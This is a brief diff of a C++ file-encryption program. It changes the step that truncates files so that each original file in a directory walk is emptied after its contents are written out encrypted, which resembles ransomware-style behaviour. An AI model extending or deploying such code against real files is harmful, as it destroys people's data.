@@ -36,9 +36,10 @@ int main() {
                         encrypt << it.second;
                     }
                 }
+                encrypt << '\n';
             }
             std::ofstream ofs;
-            ofs.open(path, std::ofstream::out | std::ofstream::trunc);
+            ofs.open(entry.path(), std::ofstream::out | std::ofstream::trunc);
             ofs.close();
         }
         std::cout << "[*] File encrypted successfully\n" << std::endl;
